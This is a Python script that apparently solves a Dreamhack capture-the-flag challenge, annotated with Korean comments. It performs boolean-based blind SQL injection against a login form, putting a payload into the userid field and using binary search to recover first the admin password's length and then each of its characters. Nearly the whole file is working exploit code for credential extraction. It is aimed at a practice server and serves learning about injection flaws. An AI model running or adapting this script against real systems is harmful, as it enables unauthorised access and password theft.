#!/usr/bin/python3.9
import sys
from urllib.parse import urljoin #url 구문 분석
import requests 


class Solver:
    def __init__(self, port: str) -> None:
        self.dream_url=f"http://host3.dreamhack.games:{port}" #f-string
        self.login_url=urljoin(self.dream_url, "login") #url 구문 분석

    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data ={
            "userid": userid, 
            "userpassword": userpassword
        }
        resp=requests.post(self.login_url, data=login_data) 
        #지정된 URL로 POST 요청을 보내고, 해당 요청에 login_data를 본문 데이터에 포함
        #서버에 로그인 요청을 전송, 서버로 부터 응답을 resp 변수에 저장
        return resp
    
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ","hi") #아이디 필드에 주입, 패스워드 필드에 주입
        return resp #로그인 요청에 대한 서버의 응답
    
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            # 이진 탐색을 할때 if문에서 참이면 큰 쪽으로 반을 가르고 거짓이면 mid를 high로 해서 반을 가른다.
            mid = (low+high) // 2 #//:정수 몫 ex) 9//2 = 4
            if (low+1 >= high):
                break
            query = query_tmpl.format(val=mid)
            if ("hello" in self._sqli(query).text):
                high=mid
                #print("값이 mid보다 작습니다")
            else:
                low = mid
                #print("값이 mid보다 큽니다")
        return mid
    
    # attack methods
    def _find_password_length(self, user: str, max_pw_ln: int=100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})" #주어진 사용자의 패스워드를 가져오는 SQL 서브 쿼리 {val}을 채우기 위해 사용됨
        pw_len=self._sqli_lt_binsearch(query_tmpl, 0, max_pw_ln)

        return pw_len
    
    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ""
        for i in range(1, pw_len+1):
            query_tmpl = f"((SELECT SUBSTR(userpassword,{i},1) WHERE userid=\"{user}\")<CHAR({{val}}))"
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e))

            print(f"{i}. {pw}")
        
        return pw

    def solve(self) -> None:
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")
    
        #Find password
        print("Find Password:")
        pw= solver._find_password("admin", pw_len)
        print(f"비밀번호: {pw}")


if __name__ == "__main__":
    port =  9106

    solver = Solver(port)
    solver.solve()



